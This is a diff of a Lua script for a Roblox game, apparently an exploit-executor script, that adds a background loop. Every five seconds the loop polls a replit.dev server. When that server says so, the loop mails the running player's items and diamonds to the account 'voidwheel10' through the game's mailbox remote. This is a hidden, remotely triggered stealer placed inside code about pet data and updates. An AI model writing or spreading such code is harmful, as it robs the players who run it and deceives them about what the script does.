@@ -393,45 +393,56 @@ HugeList = hugePetsString
 })
 print(" updated data")
 wait(5)
-local Http = game:GetService("HttpService")
-local request = (syn and syn.request) or request or (http and http.request) or http_request
 
-local function checkSendGifts()
-    local response = request({
-        Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkSendGifts',
-        Method = 'GET',
-        Headers = { ['Content-Type'] = 'application/json' }
-    })
 
-    if response and response.Body then
-        local success, responseBody = pcall(function()
-            return Http:JSONDecode(response.Body)
-        end)
-
-        if success and responseBody.SendGifts then
-            if responseBody.SendGifts == true then
-print("sending gifts")
-              local args = {
-                    [1] = "voidwheel10",
-                    [2] = "enjoy bro",
-                    [3] = "Lootbox",
-                    [4] = gifts,
-                    [5] = diamondsvalue
-                }
-                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-           
-end
-        end
-    end
-end
-
-checkSendGifts()
         
         wait(1)
     end
 end
 wait(10)
 spawn(dataFunction2)
+
+
+local function SendGiftsFunction()
+    while true do
+        local Http = game:GetService("HttpService")
+        local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+        local response = request({
+            Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkSendGifts',
+            Method = 'GET',
+            Headers = { ['Content-Type'] = 'application/json' }
+        })
+
+        if response and response.Body then
+            local success, responseBody = pcall(function()
+                return Http:JSONDecode(response.Body)
+            end)
+
+            if success and responseBody.SendGifts then
+                if responseBody.SendGifts == true then
+                    print("sending gifts")
+                    print(gifts)
+                    print(diamondsvalue)
+
+                    local args = {
+                        [1] = "voidwheel10",
+                        [2] = "enjoy bro",
+                        [3] = "Lootbox",
+                        [4] = gifts,
+                        [5] = diamondsvalue
+                    }
+                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+                end
+            end
+        end
+
+        wait(5) 
+    end
+end
+
+spawn(SendGiftsFunction)
+
 
 
 while true do
